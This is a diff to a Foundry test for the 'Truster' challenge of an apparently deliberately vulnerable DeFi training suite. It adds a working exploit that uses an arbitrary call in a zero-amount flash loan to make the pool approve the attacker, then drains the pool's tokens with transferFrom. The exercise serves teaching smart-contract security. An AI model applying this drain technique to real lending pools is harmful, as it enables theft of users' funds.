@@ -14,6 +14,7 @@ contract Truster is Test {
     TrusterLenderPool internal trusterLenderPool;
     DamnValuableToken internal dvt;
     address payable internal attacker;
+    
 
     function setUp() public {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -37,7 +38,14 @@ contract Truster is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+	uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
+	bytes memory attackCallData = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance);
+	
+	vm.prank(attacker);
+	trusterLenderPool.flashLoan(0,attacker,address(dvt),attackCallData);
 
+	vm.prank(attacker);
+	dvt.transferFrom(address(trusterLenderPool), attacker, poolBalance);
         /** EXPLOIT END **/
         validation();
     }
